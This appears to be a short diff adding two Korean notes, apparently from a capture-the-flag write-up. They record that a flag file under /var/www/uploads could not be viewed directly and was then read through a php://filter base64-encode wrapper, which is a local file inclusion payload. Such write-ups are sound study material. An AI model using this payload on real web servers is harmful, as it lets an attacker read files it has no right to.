@@ -1,0 +1,2 @@
+var/www/uploads/flag 으로 접근했더니 표시되지 않음, 따라서
+php://filter/convert.base64-encode/resource=/var/www/uploads/flag로 base64로 인코딩된 값을 가져옴
